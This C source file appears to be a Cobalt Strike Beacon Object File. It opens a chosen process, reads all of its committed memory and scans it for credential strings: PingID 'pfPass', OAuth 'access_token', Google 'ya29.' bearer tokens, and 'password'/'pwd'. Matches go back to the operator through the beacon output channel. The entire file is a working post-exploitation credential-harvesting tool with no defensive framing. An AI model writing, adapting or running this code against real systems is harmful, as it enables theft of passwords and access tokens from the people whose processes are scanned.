#include <stdio.h>
#include <windows.h>
#include "beacon.h"

#define PATTERN_SIZE 5

WINBASEAPI HANDLE WINAPI KERNEL32$VirtualQueryEx(HANDLE, LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T);
WINBASEAPI void *__cdecl MSVCRT$calloc(size_t _NumOfElements, size_t _SizeOfElements);
WINBASEAPI void *__cdecl MSVCRT$memchr(void * ptr, int value, size_t num );
WINBASEAPI int __cdecl MSVCRT$memcmp( const void * ptr1, const void * ptr2, size_t num );
WINBASEAPI size_t __cdecl MSVCRT$strlen( const char * str );
WINBASEAPI int __cdecl MSVCRT$sprintf(char *, const char *, ...);

	
static  unsigned char* find_all(unsigned char* buffer, SIZE_T bufferLen, unsigned char* pattern, SIZE_T patternLen) {
    unsigned char* match = NULL;
    SIZE_T offset = 0;
    while (offset < bufferLen) {
        match = MSVCRT$memchr(buffer + offset, pattern[0], bufferLen - offset);
        if (match == NULL) {
            return NULL;
        }
        else {
            size_t remaining = bufferLen - offset - (match - buffer);
            if (patternLen <= remaining) {
                if (MSVCRT$memcmp(match, pattern, patternLen) == 0) {
                    return match;
                }
                offset = match - buffer + 1;
            }
            else {
                return NULL;
            }
        }       
    }
    return NULL;
}

void find_locs(HANDLE process, SIZE_T sz) {
    // add values as needed / adjust PATTERN_SIZE to match
    const char * pattern[PATTERN_SIZE];
    
    char ping[] = "pfPass";
    char access[] = "access_token";
    char google[] = "ya29.";
    char pass[] = "password";
    char pwd[] = "pwd";

    pattern[0] = ping;    // pingID https://support.pingidentity.com/servlet/servlet.FileDownload?file=00P1W00001Vvc0jUAB
    pattern[1] = access;  // google APIs Bearer token
    pattern[2] = google;  // google APIs Bearer token
    pattern[3] = pass;    // generic password
    pattern[4] = pwd;     // generic password 
       
    unsigned char* p = NULL;
    MEMORY_BASIC_INFORMATION info; 
    for (p = NULL; KERNEL32$VirtualQueryEx(process, p, &info, sizeof(info)) == sizeof(info); p += info.RegionSize)
    {
        unsigned char* buffer;
        unsigned char* tempBuffer;
        int isTarget = 0;

        if (info.State == MEM_COMMIT &&
            (info.Type == MEM_MAPPED || info.Type == MEM_PRIVATE))
            {
                SIZE_T bytes_read;
                tempBuffer = MSVCRT$calloc(info.RegionSize, sizeof(tempBuffer));
                KERNEL32$ReadProcessMemory(process, p, &tempBuffer[0], info.RegionSize, &bytes_read);
                
                for (int i = 0; i < PATTERN_SIZE; i++){
                    unsigned char* match = find_all(tempBuffer, bytes_read, pattern[i], MSVCRT$strlen(pattern[i]));
            	    if (match) {
            		char * fmt = MSVCRT$calloc(40, sizeof(char));
            		MSVCRT$sprintf(fmt, "[*] MATCH FOUND : %%.%ds \n", sz);
                    BeaconPrintf(CALLBACK_OUTPUT, fmt, match);
                }
            }
        }
    }
}

int go(char* argc, int len) {
    datap parser;
    BeaconDataParse(&parser, argc, len);
    int pid = BeaconDataInt(&parser);
    int sz = BeaconDataInt(&parser);
   
    HANDLE process = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    find_locs(process, sz);
    return 0;
}
